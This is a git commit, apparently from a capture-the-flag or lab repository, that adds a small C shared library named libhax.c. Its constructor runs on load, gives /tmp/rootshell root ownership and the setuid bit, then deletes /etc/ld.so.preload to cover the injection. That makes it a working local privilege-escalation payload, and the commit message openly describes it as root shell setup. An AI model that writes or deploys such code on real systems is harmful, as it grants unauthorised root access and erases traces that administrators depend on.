44f96200f7d51e67a823217a75cdfa0b32d18c2c
Vedant Kanoujia <68261108+fatherofphysics@users.noreply.github.com>
2026-03-29 08:11:34 +0530

    Add dropshell function for root shell setup
    Implement dropshell function to set up a rootshell.

---
+++ haircut/libhax.c
@@ -0,0 +1,11 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/stat.h>
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown("/tmp/rootshell", 0, 0);
+    chmod("/tmp/rootshell", 04755);
+    unlink("/etc/ld.so.preload");
+    printf("[+] done!\n");
+}
